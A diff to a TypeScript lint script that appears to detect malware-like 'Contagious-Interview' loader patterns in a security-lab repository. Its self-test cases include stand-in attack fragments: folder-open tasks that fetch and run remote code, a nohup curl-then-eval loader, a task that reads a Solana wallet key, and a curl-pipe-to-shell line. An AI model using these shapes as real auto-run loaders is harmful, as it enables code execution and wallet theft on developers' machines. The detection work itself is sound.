@@ -13,6 +13,7 @@
 import * as fs from 'node:fs';
 import * as net from 'node:net';
 import * as path from 'node:path';
+import { avFindings } from './av-shape.ts';
 
 const repo = path.resolve(import.meta.dirname, '../..');
 const selfTest = process.argv[2] === '--self-test';
@@ -117,28 +118,35 @@ function lintLine(rel: string, line: string, n: number): string[] {
 	}
 	return out;
 }
+const AV_SELF = new Set([path.join('test', 'safety', 'fixture-lint.ts'), path.join('test', 'safety', 'av-shape.ts')]);
+const lintedTexts = new Map<string, string>();
 function lintFile(file: string): void {
 	const rel = path.relative(repo, file);
-	if (rel === path.join('test', 'safety', 'fixture-lint.ts')) {
+	if (AV_SELF.has(rel)) {
 		return; // the rules themselves
 	}
 	scanned++;
 	const text = fs.readFileSync(file, 'utf8');
+	lintedTexts.set(rel.split(path.sep).join('/'), text);
 	violations.push(...lintText(rel, text));
 }
 /**
- * AV-signature rule (EDR fixture-safety): no host file may carry a live-malware pattern that
- * endpoint protection flags (Microsoft Defender quarantined a faithful Contagious-Interview
- * tasks.json as Trojan:Script/MalTask.A). A folder-open task together with a fetch tool in
- * one file is refused outright; such content is stored as parts and assembled only inside
- * a tab. Not opt-outable, like download-exec.
+ * AV-signature rules (EDR fixture-safety, test/safety/av-shape.ts): no host file may carry the
+ * loader shape endpoint protection flags (Defender: Trojan:Script/MalTask.A on a faithful
+ * Contagious-Interview tasks.json, then split-file variants). Checked across files, so a
+ * folder-open task whose script holds the loader traits is caught. Not opt-outable; such
+ * content is stored as encoded parts and assembled only inside a tab.
  */
-function lintText(rel: string, text: string): string[] {
-	const out = text.split('\n').flatMap((line, i) => lintLine(rel, line, i + 1));
-	if (/folderOpen/.test(text) && new RegExp(String.raw`\b(${FETCH}|urllib|https\.get)\b`, 'i').test(text)) {
-		out.push(`${rel}: av-loader: folder-open task and a fetch tool in one file (AV signature; store as parts, assemble in the tab)`);
+function readRepo(rel: string): string | undefined {
+	try {
+		const p = path.join(repo, rel);
+		return fs.statSync(p).size < 2 << 20 ? fs.readFileSync(p, 'utf8') : undefined;
+	} catch {
+		return undefined;
 	}
-	return out;
+}
+function lintText(rel: string, text: string): string[] {
+	return text.split('\n').flatMap((line, i) => lintLine(rel, line, i + 1));
 }
 /**
  * Repo-wide AV pass (review CI-A): every tracked text file, docs included, must not carry a
@@ -152,9 +160,10 @@ function avLine(rel: string, line: string, n: number): string[] {
 if (process.argv[2] === '--av') {
 	// argv[3]: NUL-separated tracked file list (git ls-files -z), relative to the repo.
 	const out: string[] = [];
+	const texts = new Map<string, string>();
 	let n = 0;
 	for (const rel of fs.readFileSync(process.argv[3] === '-' ? 0 : process.argv[3], 'utf8').split('\0').filter(Boolean)) {
-		if (rel === 'test/safety/fixture-lint.ts' || /\.(png|jpe?g|gif|ico|woff2?|zip|gz|tgz|vsix)$/.test(rel)) {
+		if (AV_SELF.has(rel) || /\.(png|jpe?g|gif|ico|woff2?|zip|gz|tgz|vsix)$/.test(rel)) {
 			continue;
 		}
 		let text: string;
@@ -164,16 +173,15 @@ if (process.argv[2] === '--av') {
 			continue;
 		}
 		n++;
+		texts.set(rel, text);
 		// Logical lines: backslash continuations joined, plus a two-line window (L-1).
 		const lines = text.replace(/\\\r?\n/g, ' ').split('\n');
 		lines.forEach((l, i) => {
 			const hit = avLine(rel, l, i + 1);
 			out.push(...(hit.length ? hit : avLine(rel, `${l} ${lines[i + 1] ?? ''}`, i + 1)));
 		});
-		if (rel.startsWith('test/containment/fixtures/') || rel.endsWith('tasks.json')) {
-			out.push(...lintText(rel, text).filter(v => v.includes('av-loader')));
-		}
 	}
+	out.push(...avFindings(texts));
 	console.log(out.length ? `${out.join('\n')}\nfixture-lint --av: ${out.length} violation(s)` : `fixture-lint --av: clean (${n} tracked files)`);
 	process.exit(out.length ? 1 : 0);
 }
@@ -199,13 +207,22 @@ if (selfTest) {
 		['<app>/Contents/Resources/app/bin/code --user-data-dir x', 1], ['export function activate(context) {', 0], ['open README.md', 0],
 	];
 	const bad = cases.filter(([l, n]) => lintLine('self-test', l, 1).length !== n).map(([l, n]) => `expected ${n}: ${l} -> ${JSON.stringify(lintLine('self-test', l, 1))}`);
-	// File-level AV-signature rule, and the repo-wide URL loader rule.
-	const files: Array<[string, number]> = [
-		[`{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"${W} -q http://a.example.test/s"}]}`, 1],
-		['{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"sh .seclab/probe.sh task"}]}', 0],
-		['{"fetchTool":["cu","rl"],"interpreter":["no","de"]}', 0],
+	// Workspace-level AV shapes (av-shape.ts): single-file, split-file, host file, and exemptions.
+	const T = 'tasks.json', FO = '"runOptions":{"runOn":"folderOpen"}';
+	const ws = (entries: Array<[string, string]>) => new Map(entries);
+	const files: Array<[string, Map<string, string>, number]> = [
+		['one-file loader', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"${W} -q http://a.example.test/s"}]}`]]), 1],
+		['inert probe task', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"sh .seclab/probe.sh task"}]}`], ['w/.seclab/probe.sh', 'echo ok > "$RUN/evidence"\n']]), 0],
+		['split-file loader (task -> script with fetch + eval + nohup)', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"sh .seclab/loader.sh"}]}`],
+			['w/.seclab/loader.sh', `nohup sh -c "${F} -s -o /dev/null http://192.0.2.10/p; node -${'e'} 1" &\n`]]), 2],
+		['split-file: wallet path only', ws([[`w/.vscode/${T}`, `{"tasks":[{"presentation":{"reveal":"never"},"command":"\${workspaceFolder}/run.sh"}]}`], ['w/run.sh', `cat ~/.config/sol${'ana'}/id.json\n`]]), 1],
+		['split-file: args array, node script', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"node","args":["scripts/setup.js"]}]}`], ['w/scripts/setup.js', `require('child_process').spawn('x', [], { detached: true })\n`]]), 1],
+		['parts are exempt', ws([['w/.seclab/loader.parts.json', `{"a":"${F} -s http://192.0.2.10/p","b":"${P}sh"}`]]), 0],
+		['host file fetch + eval', ws([['tools/x.sh', `${F} -s http://192.0.2.10/p -o p.js\nnode -${'e'} "$(cat p.js)"\n`]]), 1],
+		['harness fetch without eval', ws([['tools/y.sh', `${F} -fsS http://127.0.0.1:8080/health\n`]]), 0],
+		['task without auto-run', ws([[`w/.vscode/${T}`, `{"tasks":[{"command":"sh run.sh"}]}`], ['w/run.sh', `nohup x &\n`]]), 0],
 	];
-	bad.push(...files.filter(([t, n]) => lintText('self-test', t).filter(v => v.includes('av-loader')).length !== n).map(([t, n]) => `expected ${n} av-loader: ${t}`));
+	bad.push(...files.filter(([, m, n]) => avFindings(m).length !== n).map(([name, m, n]) => `expected ${n} av findings (${name}): ${JSON.stringify(avFindings(m))}`));
 	const docs: Array<[string, number]> = [[`Its command is \`${F} 'https://x.vercel.app/s?flag=1'${P}sh\``, 1], [`hides \`${F} …${P}sh\` in a task`, 0],
 		[`fetches hxxps://x[.]vercel[.]app/s and pipes it into a shell`, 0]];
 	bad.push(...docs.filter(([l, n]) => avLine('self-test', l, 1).length !== n).map(([l, n]) => `expected ${n} av-url-loader: ${l}`));
@@ -235,6 +252,7 @@ function walk(p: string): void {
 for (const r of roots) {
 	walk(r);
 }
+violations.push(...avFindings(lintedTexts, readRepo));
 // Recorded evidence (probe runs and their outputs) holds strings a hostile tab chose. Only the
 // agent-injection rule applies there: real hosts and paths in evidence are facts, not payloads.
 if (!args.length) {
